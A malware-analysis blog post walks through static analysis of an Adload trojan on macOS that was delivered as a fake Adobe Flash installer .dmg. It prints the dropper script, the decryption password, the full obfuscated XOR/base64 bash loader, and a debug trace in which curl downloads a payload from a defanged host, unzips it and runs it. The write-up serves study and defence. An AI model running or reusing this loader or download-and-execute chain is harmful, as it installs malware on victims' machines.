---
layout: post
title: Adload Sample, Part 1: Static Analysis
---
Happy New Year! Excuse my absense, while I have been away taking studying for GCFA and enjoying the holidays. Now that's all over I'm back to show you some static analysis of a macOS trojan I found today. Hope you enjoy and please send any questions, or comments to ragingroosterrem@gmail.com. Thanks!

### Tools Used:
- macOS High Sierra virtualized with Virtualbox
- Bash Commands: bash, cat, cd, clamscan, codesign, file, find, hdiutil, ls, md5, openssl, plutil, shasum
- VirusTotal

### The Story, YAFFD
I was googling a security tool called moloch + threat hunting and clicked on a link to what I thought was a security blog containing some juciy information. It was the third link, on the first page of results mind you! Instead of being served up some info to make my day better, I was redirected to Yet Another Fake Flash Downloader (YAFFD). Okay, I'd preffer to do some malware analysis anyway.

<img src="{{ site.baseurl }}/images/YAFFD.png">

### Analysis

#### After, I clicked the pretty button and downloaded the .dmg I fired up my shell and went to my downloads folder to see what gift I was given.
```
$ cd ~/Downloads

$ ls
AdobeFlashPlayerInstaller.dmg

$ file AdobeFlashPlayerInstaller.dmg 
AdobeFlashPlayerInstaller.dmg: zlib compressed data

$ md5 AdobeFlashPlayerInstaller.dmg 
MD5 (AdobeFlashPlayerInstaller.dmg) = 8c5a97b8234af7f41e03b4421904a8ff

$ shasum AdobeFlashPlayerInstaller.dmg 
b972667995d2ca1d205c3be4d57fc80814834970  AdobeFlashPlayerInstaller.dmg

$ codesign -dvvv AdobeFlashPlayerInstaller.dmg 
AdobeFlashPlayerInstaller.dmg: code object is not signed at all
```
_Hey! Wouldn't Adobe sign this?_

#### Let's tear into this .dmg like a bag of hot cheetos.
```
$ hdiutil attach AdobeFlashPlayerInstaller.dmg 
Checksumming Protective Master Boot Record (MBR : 0)…
Protective Master Boot Record (MBR :: verified   CRC32 $7510EE46
Checksumming GPT Header (Primary GPT Header : 1)…
 GPT Header (Primary GPT Header : 1): verified   CRC32 $366ED316
Checksumming GPT Partition Data (Primary GPT Table : 2)…
GPT Partition Data (Primary GPT Tabl: verified   CRC32 $70831B84
Checksumming  (Apple_Free : 3)…
                    (Apple_Free : 3): verified   CRC32 $00000000
Checksumming disk image (Apple_HFS : 4)…
..............................................................................
          disk image (Apple_HFS : 4): verified   CRC32 $B3A8FFCC
Checksumming  (Apple_Free : 5)…
                    (Apple_Free : 5): verified   CRC32 $00000000
Checksumming GPT Partition Data (Backup GPT Table : 6)…
GPT Partition Data (Backup GPT Table: verified   CRC32 $70831B84
Checksumming GPT Header (Backup GPT Header : 7)…
  GPT Header (Backup GPT Header : 7): verified   CRC32 $00709B9F
verified   CRC32 $7647ACE4
/dev/disk1          	GUID_partition_scheme          	
/dev/disk1s1        	Apple_HFS                      	/Volumes/Player

$ cd /Volumes/Player/

$ find .
.
./.5692438210.png
./.DS_Store
./Player_210.app
./Player_210.app/Contents
./Player_210.app/Contents/_CodeSignature
./Player_210.app/Contents/_CodeSignature/CodeDirectory
./Player_210.app/Contents/_CodeSignature/CodeRequirements
./Player_210.app/Contents/_CodeSignature/CodeRequirements-1
./Player_210.app/Contents/_CodeSignature/CodeResources
./Player_210.app/Contents/_CodeSignature/CodeSignature
./Player_210.app/Contents/Info.plist
./Player_210.app/Contents/MacOS
./Player_210.app/Contents/MacOS/Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg
./Player_210.app/Contents/Resources
./Player_210.app/Contents/Resources/210
./Player_210.app/Contents/Resources/app5692438210.icns
./Player_210.app/Contents/Resources/enc
```
_Looks similar to most other .dmg directory structures._

##### Let's take a look at the .dmg's Property List (plist) which stores some valuable app data.
```
$ cd /Volumes/Player/Player_210.app/

$ plutil -p Info.plist 
{
  "CFBundleExecutable" => "Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg"
  "CFBundleIconFile" => "app5692438210.icns"
  "CFBundleIdentifier" => "com.Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg"
  "CFBundleInfoDictionaryVersion" => "6.0"
  "CFBundleName" => "PlayerInstaller"
  "CFBundlePackageType" => "APPL"
  "CFBundleShortVersionString" => "1.0"
  "CFBundleSupportedPlatforms" => [
    0 => "MacOSX"
  ]
  "CFBundleVersion" => "5692438210"
  "LSMinimumSystemVersion" => "10.9"
  "NSHumanReadableCopyright" => "Copyright © 2017 All rights reserved."
  "NSPrincipalClass" => "NSApplication"
}
```
_Looks like "Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg" is the binary executed by the .dmg._

##### Let's inspect the binary.
```
$ cd MacOS/

$ ls
Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg

$ file Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg 
Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg: Bourne-Again shell script text executable, ASCII text
```
_Hey! That's a shell script, not a Macho... But, that's not too extraordinary._

##### Let's just see what it does.
```bash
$ cat Xl5NyWPPpAg.cD3QOlw2RV1GoEhnKg 
#!/bin/bash
cd "$(dirname "$BASH_SOURCE")"
fileDir="$(dirname "$(pwd -P)")"
eval "$(openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:5692438210 <"$fileDir"/Resources/enc)"
```
_Okay, so this is interesting. The bash script uses openssl to decrypt whatever is in enc using base64 & AES 256._

#### Let's see what /Resources/enc is!
```
$ cd /Volumes/Player_210.app/Contents/Resources

$ file enc 
enc: ASCII text
```
_Yep. As expected._

#### Time to decrypt it. Thanks for giving me the command & password to do it!
```bash
$ openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:5692438210 < enc > ~/Desktop/decoded.sh

$ cd ~/Desktop

$ cat ~/Desktop/decoded.sh
#!/bin/bash
_l() {
    _i=0;
    _x=0;
    for ((_i=0; _i<${#1}; _i+=2)) do 
        __return_var="$__return_var$(printf "%02x" $(( ((0x${1:$_i:2})) ^ ((0x${2:$_x:2})) )) )"
        if (( (_x+=2)>=${#2} )); then ((_x=0)); fi
    done
    if [[ "$3" ]]; then eval "$3='$__return_var'"; else echo -n "$__return_var"; fi
}

_m() {
    _v=$(base64 --decode <(printf "$1"));
    _k=$(xxd -pu <(printf "$2"));
    __return_var="$(xxd -r -p <(_l "$_v" "$_k"))"
    if [[ "$3" ]]; then eval "$3='$__return_var'"; else echo -n "$__return_var"; fi
}
_y="5692438210"
_t="MTYxNzE2NTA1ZDVkMTc1MDUwNDM1ZDNjNWY0NzVhNTA0YzViNWU1ZTE1NTU1MTU3NTc1ODc1NTYwNDE4MWMxNjQyMzgxNDEzMTgxMjU0NDg1NjVhNGM1NjUxNTc3YzViNDM0MzA4MWUxZTFkNjI1YzU0NDc1YzU1NDYxOTY5NDA1MTUxNTc1ZDQ1MWYxMjE2MWUxZDYyNWM1NDQ3NWM1NTQ2MTk3NDUzNTc1YTU2NDY1ZTQzNWQxNjcxNzYxYjE0MTgxNTFlNjY1YTVhNGM1ZjUxNDAxNzYwNTQ1MzVhNDA1YzQwNGQxYzFmMWIzYjNhMTUxNjE5MTI1MjVjNGExMjQ3NWY1OTQzNTQ1NzcwNWE0YTEyNTg1ZTE1MTk2ZjVkNTg0NjU1NTc0MjFmMWYxOTMzMTIxNDEzMTg1NjVlM2ExNTE2MTkxMjE0MTMxODEyNDI1YjVjNDYwNDAyM2UxMzE4MTIxMTEwMTUxNjE5NTQ1YjQxMTg1NzQ5NTM1OTQzNWQ1NzUwNzc1MTQwMTE1OTViMTYxYjE2NGY1NjQwNTE1ZDQ1NTE1MzVkNzY1ZDQxNGI2OTcxNmQ0ODE0MzMxMjE0MTMxODEyMTExMDE1NTI1NjM4MTQxMzE4MTIxMTEwMTUxNjE5MTIxNDEzNTE1NDExNmI2ZTE2MWIxNjUxNGI1YjVlNDQ1NDUwNTI3ZDViNDYxMTE4MGYwYzEwMTcxMjRmNWQ1ODQ2NTU1Nzc1NTk0NzE0MTk2ZjY5MDgxODQ2NTk1NTViM2MxOTEyMTQxMzE4MTIxMTEwMTUxNjE5MTIxNDEzMTgxMjQyNWI1YzQ2MDQwMzNlMTMxODEyMTExMDE1MTYxOTEyMTQxMzE4MTIxMTEwMTU1NDRiNTc1NTU4MDMzODExMTAxNTE2MTkxMjE0MTMxODEyMTExMDUzNWYzMzEyMTQxMzE4MTIxMTEwMTU1MjU2NWM1MTM5MTgxMjExMTAxNTE2MTkxMjVkNTUxODY5MTExNDQ2NWQ1MDQyMTQwZTA1MTIwMDEwNjgwZDE5NDY1YzU2NTYzODExMTAxNTE2MTkxMjE0MTMxODEyMTExMDU2NTk1NzQ2NWQ1ZDRkNTcwYTNhMTUxNjE5MTIxNDEzMTgxMjU3NTkxNTNjMTkxMjE0MTMxODEyMTExMDNmMTYxOTEyMTQxMzE4MTIxMTQ2NWE1YTRjNWY1MTdlNWMwNzBjMTIxMTFlNWY1YjVhNTcxODEwMTU0NjVhNWE0YzVmNTE3NzUxNDAxZTE0MDQxOTFiMTIxOTQ3NDE0MjU0MTA1MzE2MTQ1NzRjNTY1YjEyNWM1NDAwMTYxNDQzMTQ0ODQ1MTI2ZDBiMTU0YTE5NWY1MDA2MTgxZjQwMTkxNzNjMTkxMjE0MTMxODEyMTExMDE2NTM1YTVhNWIxMzFhMTY0NzVmNTk0MzU0NTc3MDVhNGExMjVjNTQwMDBjMTkxNjQyNWM1NDQ3NWM1NTc4NTIwYzEwM2UzOTE4MTIxMTEwMTUxNjE5MTI1ZDU1MTg2OTExMTQwNzE2MDQwZjE0MTc0ZTVkNWQ0NTU4NTM3NDU2MDExMzY1MDkxMTQ0NWQ1MzU3MzgxNDEzMTgxMjExMTAxNTE2MTkxMjE0MTM1ZDUxNTk1ZjE1MTQxZDQ0NWI1ZjRkNWY1NDc0NWM0NDFiMDkzZTEzMTgxMjExMTAxNTE2MTkxMjE0MTMxODQwNTQ0NDQwNDQ1NzA5M2UxMzE4MTIxMTEwMTUxNjE5NTQ1ZDM5MTgxMjExMTA1MTU5NTc1NzNlNGUzMjUxNDQ0MjQ3NTM1NzQ2NzA1YTRhMGYxMzE0NjU2MTdkMTAzZTUyNDg0Mjc1NTk0NzBiMWIxNjFjNTc1MTQwNWY1MTU4NTMxOTE2MWM1NzUxNDA1ZjUxNTg1MzE5MTAxMDUwNGQ0MDQzNTU1YjQyN2Q1YjQ2MTExMTFiMTMzYTU0NDY0OTdjNTU1ZTVkMGYxMzE0MWQ1NDU4NDE1MTVkNTk1ZjU0MTAxNzEyNTg0MjQ0Nzc1MTQwMTMxOTE3M2M1YTQ3NDY0MTVkNWM0NTdkNTEwMzA0MTAxMDFiNWU1YjVmNTQxNTE0MWQ1MzQ0NDM3YzViNDMxMjE1MWI0ZDRiNDQ1NjE4NTQxMTFkNTA0ZTVjNTExNDVlNWMwNzExMWQ0NDE2NDI0ZjE0NmYwMzEyNGQxMDU4NTIwYzEyMTk0MjExMTAzYjQ2NWE1YTRjNWY1MTZjNTY1MzVjNTUwODE0MWQxYTU3NWI1ZDUxNWE3ZDUxMDMxOTEwMTA1MjQ4NDI3ZjUxNTg1MzFiMTIxNjE3NWI0NzQzNDI1MDU4NGQ3ZjUwMDYxYTFiMTMzYTVhNDU2NjQ0NTE0MTRiNWI1ZTVlMDgxNDFkMWE0NzQ0Njc0NDU0NDI0NjE2MTQ0MjQ2NWM1YzQ3NTI0NDYzNTM0YjQxNWQ1YzU2MWIxMzNhNDY1MzRhNDE1ZDVjNTY2ZDU2NDU1YzUyMDQxMDEwMWI0ZDQ3NTg1NDUyNTM1NzFiMTYzOTU1NTM1MjU4NWM1ODVjNmQ1ZDU3MDUxMDE1MTg1MDU1NTE1ZDE0MWU1NjEyMTMxNDFkNWY1NjQwNTE1NDE4MWY0MzU0MDQxNjE0NTExNDdhNzc2MjVkNTE0MTUwNTY0MDU5NzY0MDQyNTQ0MjQxNzI1YzQ0NWQ1MDVkMTI0ZDEwNTI0NDVjNDIxNDFlNTcxMjE2MTI3Yzc5Njk1ZTU1NDc1ZTVkNDM1ZDYwNjM3MDc2MTYxMzA1MTIxMzZjMWQxODEzNmUxZDExMWYxMjRkMTA0NjUzNWQxMjE5NzYxODFmNWYxMDEyNDU3OTFjMWUxMTEwNjk2ZjEyNjgxZDEwMTA3NDZmMDk3MjQxMTcxYzE0MTk0ZTE0NDc0YTEyMWM1NDU2MTYxZTY5NmYwOTQ4NDA1ODVlNDEwYzY0NmYxMzFhMWEzODQ0NDI1OTBiMWI1YTQwNDc0ODA4MWUxZjU0NDY1MDFjNTk1MjRiNDY1NDQyNTQ1ODU4NWU0ZDQwNWQ0MDFmNTM1YTViMTY0MTUwMWMwNzUxMGM2ZjQ1NWE2NjAwN2U0YTVhNjMwYzBkMTM0MzA0MTY1OTUyNWI1YTU4NWU1MDY5NTA1NjEyNDAwNTE2NDI1NTQ2NDU1MDVkNWE2YzVmNDc1ODU0MTM1OTA0MTY1YjQwNjc0NDU0NDI0NjVmNTY1YzEyNTEwNTA3MDcwOTA3MDIwYTBhMDYwMjA4MTAzYjQ1NWI0YzUwNDI2YjQzNTk0MTQyNDc1YTQ0NWQwZjE2MDMwOTAwMDkwMzAxMDQwMDA0MDEwYTBjMDEwNDA2MGMwNDBkMDEwYzAxMDkwMjEzM2E0MTViNDk2ZDQ0NTI0YzVhMGMxMjExMWU1NDU5NDA1NjU1NDIxMTFmNDE1YjQ5MWQ2YzZiNjA2YTY5Njg2ZDZlNjExYjE2Mzk1YjQ3NDM1YzE1MWI1ZjAyNzgxMzFhMTY0NDQyNTkxNDE5MGMxYjU3NWQ0NDFlNWU0MDVhNTUxMjA2MGQxZTAzMTEwZTBiMTI0ZDVmNDQ2YzQ4NTM0NTU4M2Y1NzQ5NDI2YjU3NTE0MDBjMTIxMTFlNTQ1OTQwNTY1NTQyMTExZDUxMTYxNjQ2NTk0MzE3NmE2OTY4NmQ2ZTYxNmE2YzFhMTcxMDNiNDU1YjRjNTA0MjE0MWU2ODEyMTMxNDQwNTg0MzViNDQ2YzQ4NTM0MjQzNDI1OTRiNTYxNjEzMWExNjQ1NWQ0NTY5NDk1MzQwNWIxYTEyMWM1NDE1MTQxZDUzNDQ0MzY3NTY1ODQyMTcxNjA3MTIxYjU3NWQ0NDFlNWU0MDVhNTUxMjA2MGQxZTAzM2I0MjU4MTYxNDU0MTQxNzRjNWY0MTZmNDU1NzRkNWEzZTU1NTE1ZTU0NmY1YjU3NTQ1NzA5MTExYzFhNTY0MjUwNDYxOTFmNTkwMjE4MWY0NzEwMTcxYzE3NTM0NDQzMWExMjBkMTg1OTQ1MTkxZjA1MTMxYTE2NTA0MDQ1Njk1ZDViNDYxMTExMWIxMzNhNDM1OTU1NDc1OTU2Njc1YzUwNWQ1MDBiMWIxNjRmNDU1NzVlNDQ1ZDUwNjk1NzUzNTk1NjE3MWQxMTFmMTAwNDA5NGYxNjM5NWI1YTVjNWY1MTE2MTI0YTE0MTExYzUzNDE0MDZhNTI1MDQwMTA1NTUxNWU1NDZmNWI1NzU0NTcxYjcwNTc1YzQ1NTU1YjQyNGExZDc5NTI1YjdkNjIxMjFhMWMzMzVkNDQ1NjU2MTIxYzUxMTUxNDFkNTM0NDQzNjc1NjU4NDIxMTUwNTA1ZTUxNmM1NjUzNWM1NTE3MTYxNDFmNTU0MTVmNDExMTEyNDYxNDE5MTAxMDQwNWQ0MTQyNTk1YTU4NjY1NTQxNWE1YzEwMTExMjExNDA1NjVlNDE1ZTVkNmQ1ZjUxNTg1MzFi"
eval "$(_m "$_t" "$_y")"
```
_Eek! I don't want to spend all day on those loops. These functions are likely used to call down another binary. "_t" is defintely obfuscated, likely multiple times based on the xxd command_

#### Shortcut: Debug it with bash
```
$ bash -x decoded.sh 2> debugged.txt
```
_ This takes a minute. And executes the script! So that means... do it in a VM on your analysis system! When I executed it a "flash installer" wizard popped up at the end._
```
------TRUNCATED DUE TO LENGTH--------
++ url='http://api[.]masteranalyser[.]com/sd/?c=_pl_2JybQ==&u=95DF5053-0A0C-4E96-BA3C-143C4E0364F5&s=257AF0DD-4AE7-4324-B1FF-BA47F1DE654F&o=10.13.3&b=5692438210'
++ unzip_password=01283429659435692438210
+++ mktemp /tmp/XXXXXXXXX
++ tmp_path=/tmp/yWfcf6tRW
++ curl -f0L 'http://api[.]masteranalyser[.]com/sd/?c=_pl_2JybQ==&u=95DF5053-0A0C-4E96-BA3C-143C4E0364F5&s=257AF0DD-4AE7-4324-B1FF-BA47F1DE654F&o=10.13.3&b=5692438210'
+++ mktemp -d /tmp/XXXXXXXX
++ app_dir=/tmp/kMeQxavD/
++ unzip -P 01283429659435692438210 /tmp/yWfcf6tRW -d /tmp/kMeQxavD/
++ rm -f /tmp/yWfcf6tRW
+++ grep -m1 -v '*.app' /dev/fd/63
++++ ls -1 /tmp/kMeQxavD/
++ file_name=Player.app
++ volume_name=
++ chmod +x /tmp/kMeQxavD/Player.app/Contents/MacOS/5693093694
++ open -a /tmp/kMeQxavD/Player.app --args s 257AF0DD-4AE7-4324-B1FF-BA47F1DE654F ''
```
_There is a lot of output in the debug file, we may need to reference this later, but for now the important part is a file was downloaded from api[.]masteranalyser[.]com with my machine UID, placed in the tmp directory, and then executed. Note: I defanged the URLs in the output._


